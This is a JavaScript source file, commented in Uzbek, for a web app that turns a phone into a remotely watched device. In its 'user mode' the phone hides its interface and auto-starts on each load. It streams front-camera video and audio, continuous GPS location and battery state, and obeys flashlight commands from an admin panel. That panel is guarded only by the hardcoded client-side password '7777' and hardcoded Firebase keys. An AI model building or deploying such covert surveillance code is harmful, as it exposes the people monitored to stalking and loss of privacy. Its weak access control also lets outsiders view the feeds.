// 1. FIREBASE KONFIGURATSIYASI
const firebaseConfig = {
    apiKey: "AIzaSyBhzWWFFgrOH84J2RIW5o7l_8192iPtbOg",
    authDomain: "code-vibe-df610.firebaseapp.com",
    projectId: "code-vibe-df610",
    databaseURL: "https://code-vibe-df610-default-rtdb.firebaseio.com",
    storageBucket: "code-vibe-df610.firebasestorage.app",
    messagingSenderId: "747762490655",
    appId: "1:747762490655:web:125516814620784cf3a42a",
    measurementId: "G-3QE6F8LWZ1"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const adminPass = "7777";

let peer = null;
let adminPeer = null;
let localStream = null;
let currentActiveCallId = null;
let isTalking = false;
let map = null;
let marker = null;
let isFlashlightOn = false;

// --- LOG TIZIMI ---
function sendLog(msg) {
    const id = peer ? peer.id : 'no-id';
    db.ref('devices/' + id + '/logs').push({
        time: new Date().toLocaleTimeString(),
        message: msg
    });
}

window.onerror = (m, u, l) => sendLog(`Xato: ${m} | Qator: ${l}`);

window.onload = () => {
    const role = localStorage.getItem('myRTC_role');
    const name = localStorage.getItem('myRTC_deviceName');
    if (role === 'user' && name) startUserLogic(name);
    else if (role === 'admin') openAdmin(true);
};

function goHome() {
    localStorage.clear();
    window.location.reload();
}

// --- USER MODE (TELEFON) ---
async function startUserLogic(deviceName) {
    document.getElementById('main-ui').style.display = 'none';
    peer = new Peer();

    peer.on('open', (id) => {
        db.ref('devices/' + id).set({ name: deviceName, status: 'online' });
        db.ref('devices/' + id).onDisconnect().remove();
        sendLog("Telefon onlayn. Old kamera faol.");
        
        // BATARYA MA'LUMOTI (TUZATILDI)
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                const updateBattery = () => {
                    db.ref('devices/' + id + '/info').update({
                        battery: Math.floor(battery.level * 100) + "%",
                        charging: battery.charging
                    });
                };
                updateBattery();
                battery.onlevelchange = updateBattery;
                battery.onchargingchange = updateBattery;
            });
        }

        // FONARNI BOSHQARISH (ADMIN BUYRUG'INI KUTISH)
        db.ref('devices/' + id + '/commands/flashlight').on('value', async (snap) => {
            const status = snap.val();
            const track = localStream.getVideoTracks()[0];
            if (track && track.getCapabilities().torch) {
                try {
                    await track.applyConstraints({ advanced: [{ torch: status }] });
                    isFlashlightOn = status;
                    sendLog(`Fonar ${status ? 'yoqildi' : 'o\'chirildi'}`);
                } catch (e) {
                    sendLog("Fonar xatosi: " + e.message);
                }
            }
        });

        // GPS
        navigator.geolocation.watchPosition(p => {
            db.ref('devices/' + id + '/location').set({
                lat: p.coords.latitude, lng: p.coords.longitude, time: new Date().toLocaleTimeString()
            });
        });
    });

    try {
        localStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, // OLD KAMERA
            audio: true 
        });
        
        peer.on('call', call => {
            call.answer(localStream);
            call.on('stream', s => {
                const a = new Audio(); a.srcObject = s; a.play();
            });
        });
    } catch (e) {
        sendLog("Kamera ochilmadi: " + e.message);
    }
}

// --- ADMIN MODE ---
function openAdmin(auto = false) {
    if (!auto && prompt("Parol:") !== adminPass) return;
    localStorage.setItem('myRTC_role', 'admin');
    document.getElementById('main-ui').style.display = 'none';
    document.getElementById('admin-panel').style.display = 'block';
    document.getElementById('top-nav').style.display = 'flex';
    if (!adminPeer) adminPeer = new Peer();

    db.ref('devices').on('value', snap => {
        const list = document.getElementById('device-list');
        list.innerHTML = "";
        snap.forEach(child => {
            const btn = document.createElement('button');
            btn.className = "btn-user-select";
            btn.innerText = child.val().name;
            btn.onclick = () => connectToDevice(child.key, child.val().name);
            list.appendChild(btn);
        });
    });
}

function connectToDevice(id, name) {
    currentActiveCallId = id;
    document.getElementById('target-name').innerText = "Qurilma: " + name;

    // ZARYADNI KO'RSATISH
    db.ref('devices/' + id + '/info').on('value', s => {
        const info = s.val();
        if (info) {
            document.getElementById('battery-display').innerText = `Quvvat: ${info.battery} ${info.charging ? '(Zaryadlanmoqda)' : ''}`;
        }
    });

    // QOLGAN MONITORING (MAP, VIDEO, LOGS...)
    const call = adminPeer.call(id, null);
    call.on('stream', s => { document.getElementById('remoteVideo').srcObject = s; });
}

// FONARNI YOQISH FUNKSIYASI (ADMIN TUGMASI UCHUN)
function toggleFlashlight() {
    if (!currentActiveCallId) return;
    isFlashlightOn = !isFlashlightOn;
    db.ref('devices/' + currentActiveCallId + '/commands/flashlight').set(isFlashlightOn);
    const btn = document.getElementById('flashBtn');
    btn.innerText = isFlashlightOn ? "FONARNI O'CHIRISH" : "FONARNI YOQISH";
    btn.style.background = isFlashlightOn ? "#e74c3c" : "#f39c12";
}
